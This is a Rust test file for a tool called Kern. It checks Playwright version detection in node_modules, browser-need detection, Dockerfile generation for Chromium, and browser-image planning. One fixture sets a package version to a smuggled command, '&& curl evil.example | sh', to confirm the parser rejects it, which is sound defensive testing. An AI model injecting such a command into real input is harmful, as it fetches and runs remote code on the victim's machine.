use kern::drive::{browser_dockerfile, browser_need, browser_plan};
use kern::sandbox::installed_versions;

fn package(root: &std::path::Path, dir: &str, json: &str) {
    let d = root.join(dir);
    std::fs::create_dir_all(&d).unwrap();
    std::fs::write(d.join("package.json"), json).unwrap();
}

#[test]
fn the_playwright_versions_are_the_ones_the_install_put_on_disk_wherever_they_sit() {
    let t = std::env::temp_dir().join(format!("kern-browser-test-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&t);
    package(&t, "node_modules/playwright-core", r#"{"name":"playwright-core","version":"1.49.1","bin":{"playwright-core":"cli.js"}}"#);
    package(&t, "node_modules/postcss", r#"{"name":"postcss","version":"8.5.30"}"#);
    package(&t, "node_modules/@vitest/browser-playwright/node_modules/playwright", r#"{"name":"playwright","version":"1.50.0"}"#);
    package(&t, "node_modules/.pnpm/playwright@1.51.0/node_modules/playwright", r#"{"name":"playwright","version":"1.51.0"}"#);
    package(&t, "packages/web/node_modules/playwright-core", r#"{"name":"playwright-core","version":"1.52.0"}"#);
    package(&t, "node_modules/playwright-chromium", r#"{"name":"playwright-chromium","version":"1.53.0"}"#);
    package(&t, "node_modules/fake/node_modules/playwright", r#"{"name":"not-playwright","version":"9.9.9"}"#);
    package(&t, "node_modules/odd/node_modules/playwright-core", r#"{"name":"playwright-core","version":"1.0.0 && curl evil.example | sh"}"#);
    package(&t, "src/playwright", r#"{"name":"playwright","version":"7.7.7"}"#);
    assert_eq!(installed_versions(&t, &["playwright", "playwright-core"]), ["1.49.1", "1.50.0", "1.51.0", "1.52.0"],
        "only real playwright packages count, read from their own package.json, never a neighbour's version or one that is not a plain version");
    let _ = std::fs::remove_dir_all(&t);
}

#[test]
fn versions_sort_by_number_and_a_prerelease_playwright_is_kept() {
    let t = std::env::temp_dir().join(format!("kern-browser-sort-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&t);
    package(&t, "node_modules/playwright", r#"{"name":"playwright","version":"1.10.0"}"#);
    package(&t, "a/node_modules/playwright", r#"{"name":"playwright","version":"1.9.0"}"#);
    package(&t, "b/node_modules/playwright-core", r#"{"name":"playwright-core","version":"1.50.0-alpha-2024-11-20"}"#);
    assert_eq!(installed_versions(&t, &["playwright", "playwright-core"]), ["1.9.0", "1.10.0", "1.50.0-alpha-2024-11-20"]);
    let _ = std::fs::remove_dir_all(&t);
}

#[test]
fn a_project_whose_tests_drive_a_browser_gets_one_and_the_rest_do_not() {
    let vitest = vec![r#"{"devDependencies":{"vitest":"3.2.4","@vitest/browser-playwright":"4.0.0"}}"#.to_string()];
    assert_eq!(browser_need(&vitest), Some("the project uses @vitest/browser-playwright".to_string()), "vuetify, svelte, elevenlabs");
    let puppeteer = vec![r#"{"devDependencies":{"puppeteer":"24.1.0"}}"#.to_string()];
    assert_eq!(browser_need(&puppeteer), Some("the project uses puppeteer".to_string()), "parse-dashboard and vue core use puppeteer, which brings its own Chrome");
    let e2e_only = vec![r#"{"devDependencies":{"@playwright/test":"1.49.1","vitest":"3.2.4"}}"#.to_string()];
    assert_eq!(browser_need(&e2e_only), None, "end-to-end tests that Kern does not run need no browser");
    assert_eq!(browser_need(&[r#"{"dependencies":{"react":"19.0.0"}}"#.to_string()]), None);
}

#[test]
fn the_browser_image_is_the_projects_own_node_image_with_the_browser_each_installed_playwright_expects() {
    let with = browser_dockerfile("kern-base:abc", &["1.49.1".to_string(), "1.50.0".to_string()]);
    assert!(with.starts_with("FROM kern-base:abc\n") && with.contains("PLAYWRIGHT_BROWSERS_PATH=/ms-playwright"), "{with}");
    assert!(with.contains("npx -y playwright@1.49.1 install --with-deps chromium") && with.contains("npx -y playwright@1.50.0 install --with-deps chromium"), "{with}");
    let deps = browser_dockerfile("kern-base:abc", &[]);
    assert!(deps.contains("install-deps chromium") && !deps.contains("install --with-deps"), "puppeteer downloads its own Chrome during install; the image only adds the system libraries: {deps}");
}

#[test]
fn both_sides_on_one_node_image_share_one_browser_image_holding_every_version_either_installed() {
    let v = |s: &[&str]| s.iter().map(|x| x.to_string()).collect::<Vec<_>>();
    let one = browser_plan(&[("sha256:a".into(), Some(v(&["1.49.1"]))), ("sha256:a".into(), Some(v(&["1.50.0"])))]);
    assert_eq!(one, [("sha256:a".to_string(), v(&["1.49.1", "1.50.0"]))], "a PR that moves Playwright gets one image, so both sides run in the same place");
    let same = browser_plan(&[("sha256:a".into(), Some(v(&["1.49.1"]))), ("sha256:a".into(), Some(v(&["1.49.1"])))]);
    assert_eq!(same, [("sha256:a".to_string(), v(&["1.49.1"]))], "the same image is never built twice");
    let two = browser_plan(&[("sha256:a".into(), Some(v(&["1.49.1"]))), ("sha256:b".into(), Some(v(&["1.49.1"])))]);
    assert_eq!(two.len(), 2, "the sides run different Node images, so each gets its own browser image");
    assert!(browser_plan(&[("sha256:a".into(), None), ("sha256:a".into(), None)]).is_empty(), "no browser dependency, no browser image");
    let many = browser_plan(&[("sha256:a".into(), Some(v(&["1.40.0", "1.41.0", "1.42.0"]))), ("sha256:a".into(), Some(v(&["1.43.0", "1.44.0", "1.45.0"])))]);
    assert_eq!(many, [("sha256:a".to_string(), v(&["1.42.0", "1.43.0", "1.44.0", "1.45.0"]))], "at most four browsers, the newest ones");
}
